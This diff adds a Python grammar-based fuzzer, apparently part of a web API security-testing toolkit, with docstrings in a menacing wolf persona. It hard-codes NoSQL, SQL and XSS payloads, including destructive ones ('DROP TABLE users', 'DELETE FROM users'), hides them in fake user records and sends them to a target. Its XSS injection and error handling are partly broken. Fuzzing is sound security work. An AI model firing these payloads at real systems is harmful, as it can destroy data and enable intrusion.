@@ -1,0 +1,327 @@
+"""
+🐺 Grammar-Based Fuzzing Engine
+
+*snarls with predatory glee* Advanced grammar-based fuzzing with learning mutations.
+Uses context-free grammars to generate syntactically valid but malicious payloads
+that can bypass input validation and exploit parsing vulnerabilities.
+
+Classes:
+    GrammarFuzzer: Grammar-based fuzzing with learning mutations
+"""
+
+import asyncio
+import json
+import random
+import time
+from typing import List, Dict, Any, Optional, Tuple
+from faker import Faker
+
+from ..core.base import BaseFuzzer
+from ..core.results import FuzzResult
+from ..core.mutations import LearningBasedMutations
+from ..core.analysis import VulnerabilityAnalyzer
+
+
+class GrammarFuzzer(BaseFuzzer):
+    """
+    🐺 Grammar-Based Fuzzing Engine
+    
+    *bares fangs with savage satisfaction* Generates syntactically valid
+    but malicious payloads using context-free grammars. Learns from successful
+    attacks and evolves payloads to be even more effective.
+    
+    This fuzzer uses grammar rules to create payloads that:
+    - Bypass input validation through syntactic correctness
+    - Exploit parsing vulnerabilities in JSON, SQL, and other formats
+    - Learn from successful attacks to improve future payloads
+    - Combine multiple attack vectors for maximum effectiveness
+    
+    Grammar Rules:
+    - JSON Injection: MongoDB-style query injection
+    - SQL Injection: Database query manipulation
+    - XSS: Cross-site scripting payloads
+    - Path Traversal: File system access attempts
+    
+    Attributes:
+        grammar_rules (Dict[str, List[str]]): Grammar rules for payload generation
+        learning_engine (LearningBasedMutations): Learning-based mutation engine
+        analyzer (VulnerabilityAnalyzer): Vulnerability detection engine
+        faker (Faker): Fake data generator for realistic payloads
+    
+    Example:
+        >>> fuzzer = GrammarFuzzer()
+        >>> results = await fuzzer.fuzz_with_grammar("/api/auth/login", "POST", 50)
+        >>> # Generates 50 grammar-based payloads with learning mutations
+    """
+    
+    def __init__(self, base_url: str = "http://localhost:8000", max_concurrent: int = 10):
+        """
+        Initialize the grammar-based fuzzer.
+        
+        *whiskers twitch with intelligence* Sets up grammar rules,
+        learning engine, and vulnerability analyzer.
+        
+        Args:
+            base_url (str): Base URL for fuzzing targets
+            max_concurrent (int): Maximum concurrent requests
+        """
+        super().__init__(base_url, max_concurrent)
+        self.learning_engine = LearningBasedMutations()
+        self.analyzer = VulnerabilityAnalyzer()
+        self.faker = Faker()
+        self.grammar_rules = self._initialize_grammar_rules()
+    
+    def _initialize_grammar_rules(self) -> Dict[str, List[str]]:
+        """
+        Initialize grammar-based attack rules.
+        
+        *snarls with predatory intelligence* Creates comprehensive
+        grammar rules for different attack vectors.
+        
+        Returns:
+            Dict[str, List[str]]: Grammar rules organized by attack type
+        """
+        return {
+            "json_injection": [
+                '{"$where": "1==1"}',
+                '{"$ne": null}',
+                '{"$regex": ".*"}',
+                '{"$gt": ""}',
+                '{"$exists": true}',
+                '{"$in": [1,2,3,4,5]}',
+                '{"$or": [{"a": 1}, {"b": 2}]}',
+                '{"$and": [{"a": 1}, {"b": 2}]}',
+                '{"$not": {"$regex": "test"}}',
+                '{"$nor": [{"a": 1}, {"b": 2}]}'
+            ],
+            "sql_injection_json": [
+                '{"query": "SELECT * FROM users WHERE id = \'1\' OR \'1\'=\'1\'"}',
+                '{"search": "admin\'--"}',
+                '{"filter": "1\' UNION SELECT NULL,NULL,NULL--"}',
+                '{"where": "id = 1; DROP TABLE users; --"}',
+                '{"condition": "name = \'admin\' OR 1=1--"}',
+                '{"value": "\' OR \'1\'=\'1"}',
+                '{"param": "1\' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"}',
+                '{"input": "admin\'; DELETE FROM users; --"}',
+                '{"data": "1\' OR EXISTS(SELECT * FROM users)--"}',
+                '{"field": "name = \'admin\' OR \'x\'=\'x\'"}'
+            ],
+            "xss_json": [
+                '{"content": "<script>alert(\'XSS\')</script>"}',
+                '{"message": "<img src=x onerror=alert(\'XSS\')>"}',
+                '{"text": "<svg onload=alert(\'XSS\')>"}',
+                '{"data": "javascript:alert(\'XSS\')"}',
+                '{"input": "<iframe src=javascript:alert(\'XSS\')>"}',
+                '{"value": "<object data=javascript:alert(\'XSS\')>"}',
+                '{"field": "<embed src=javascript:alert(\'XSS\')>"}',
+                '{"param": "<link rel=stylesheet href=javascript:alert(\'XSS\')>"}',
+                '{"content": "<meta http-equiv=refresh content=0;url=javascript:alert(\'XSS\')>"}',
+                '{"text": "<body onload=alert(\'XSS\')>"}'
+            ]
+        }
+    
+    async def fuzz_endpoint(self, endpoint: str, method: str = "POST", 
+                           payload_count: int = 50, **kwargs) -> List[FuzzResult]:
+        """
+        Fuzz endpoint using grammar-based payloads.
+        
+        *alpha wolf dominance radiates* Generates and sends grammar-based
+        payloads with learning mutations to the target endpoint.
+        
+        Args:
+            endpoint (str): Target endpoint to fuzz
+            method (str): HTTP method to use
+            payload_count (int): Number of payloads to generate
+            **kwargs: Additional fuzzing parameters
+            
+        Returns:
+            List[FuzzResult]: Results from grammar-based fuzzing
+        """
+        url = f"{self.base_url}{endpoint}"
+        results = []
+        
+        # Generate payloads using grammar rules
+        for i in range(payload_count):
+            rule_name, payload = self._generate_grammar_payload()
+            
+            try:
+                result = await self._send_grammar_request(url, method, payload, rule_name)
+                results.append(result)
+                
+                # Learning-based mutation if vulnerability detected
+                if result.vulnerability_detected:
+                    self.learning_engine.learn_from_success(rule_name, payload)
+                
+            except Exception as e:
+                # Create error result
+                error_result = FuzzResult(
+                    url=url,
+                    method=method,
+                    payload=payload,
+                    status_code=0,
+                    response_time=0.0,
+                    response_size=0,
+                    error=str(e),
+                    attack_type="grammar_based",
+                    grammar_rule=rule_name
+                )
+                results.append(error_result)
+        
+        # Add results to collection
+        self.results.extend(results)
+        return results
+    
+    def _generate_grammar_payload(self) -> Tuple[str, str]:
+        """
+        Generate payload using grammar rules and learning-based mutations.
+        
+        *circles with menacing intent* Selects grammar rule and applies
+        learning-based mutations to create evolved attack vectors.
+        
+        Returns:
+            Tuple[str, str]: (rule_name, mutated_payload)
+        """
+        # Select rule based on weights
+        rule_name = random.choice(list(self.grammar_rules.keys()))
+        rule_payloads = self.grammar_rules[rule_name]
+        
+        # Get base attack vector
+        base_vector = random.choice(rule_payloads)
+        
+        # Apply learning-based mutations
+        mutated_vector = self.learning_engine.mutate_payload(rule_name, base_vector)
+        
+        return rule_name, mutated_vector
+    
+    async def _send_grammar_request(self, url: str, method: str, payload: str, rule_name: str) -> FuzzResult:
+        """
+        Send grammar-based fuzzing request.
+        
+        *snarls with predatory glee* Creates realistic JSON payload
+        with embedded attack and sends to target endpoint.
+        
+        Args:
+            url (str): Target URL
+            method (str): HTTP method
+            payload (str): Grammar-based payload
+            rule_name (str): Grammar rule used
+            
+        Returns:
+            FuzzResult: Result of the fuzzing attempt
+        """
+        start_time = time.time()
+        
+        try:
+            # Create realistic JSON payload with embedded attack
+            ml_request = self._create_realistic_payload(payload, rule_name)
+            
+            if method.upper() == "GET":
+                response = await self.send_request(url, method="GET", params=ml_request)
+            else:
+                response = await self.send_request(
+                    url, 
+                    method=method.upper(), 
+                    json=ml_request,
+                    headers={"Content-Type": "application/json"}
+                )
+            
+            response_time = time.time() - start_time
+            
+            # Detect vulnerabilities
+            vulnerability_detected, vuln_type = self._detect_grammar_vulnerability(
+                response, payload, rule_name
+            )
+            
+            return FuzzResult(
+                url=url,
+                method=method,
+                payload=payload,
+                status_code=response.status_code,
+                response_time=response_time,
+                response_size=len(response.content),
+                vulnerability_detected=vulnerability_detected,
+                vulnerability_type=vuln_type,
+                attack_type="grammar_based",
+                grammar_rule=rule_name,
+                response_body=response.text,
+                response_text=response.text,
+                response_headers=dict(response.headers)
+            )
+            
+        except Exception as e:
+            response_time = time.time() - start_time
+            return FuzzResult(
+                url=url,
+                method=method,
+                payload=payload,
+                status_code=0,
+                response_time=response_time,
+                response_size=0,
+                error=str(e),
+                vulnerability_detected=True,
+                vulnerability_type="Exception",
+                attack_type="grammar_based",
+                grammar_rule=rule_name
+            )
+    
+    def _create_realistic_payload(self, attack_vector: str, rule_name: str) -> Dict[str, Any]:
+        """
+        Create realistic JSON payload with embedded attack.
+        
+        *bares fangs with cunning* Generates realistic-looking JSON
+        payloads that hide malicious intent within normal-looking data.
+        
+        Args:
+            attack_vector (str): The malicious attack vector
+            rule_name (str): Grammar rule being used
+            
+        Returns:
+            Dict[str, Any]: Realistic JSON payload with embedded attack
+        """
+        base_payload = {
+            "username": self.faker.user_name(),
+            "email": self.faker.email(),
+            "name": self.faker.name(),
+            "age": random.randint(18, 80),
+            "active": True,
+            "created_at": self.faker.iso8601(),
+            "metadata": {
+                "source": self.faker.user_agent(),
+                "ip": self.faker.ipv4(),
+                "location": self.faker.city()
+            }
+        }
+        
+        # Inject attack vector based on rule type
+        if "injection" in rule_name:
+            # Inject into appropriate field
+            if "sql" in rule_name:
+                base_payload["query"] = attack_vector
+            elif "xss" in rule_name:
+                base_payload["content"] = attack_vector
+            else:
+                # JSON injection - merge attack vector
+                try:
+                    attack_data = json.loads(attack_vector)
+                    base_payload.update(attack_data)
+                except:
+                    base_payload["malicious_field"] = attack_vector
+        
+        return base_payload
+    
+    def _detect_grammar_vulnerability(self, response, payload: str, rule_name: str) -> Tuple[bool, Optional[str]]:
+        """
+        Detect grammar-based vulnerabilities in response.
+        
+        *snarls with predatory intelligence* Analyzes response for
+        grammar-specific vulnerability indicators.
+        
+        Args:
+            response: HTTP response object
+            payload (str): Original payload
+            rule_name (str): Grammar rule used
+            
+        Returns:
+            Tuple[bool, Optional[str]]: (vulnerability_detected, vulnerability_type)
+        """
+        return self.analyzer.analyze_response(response, payload)
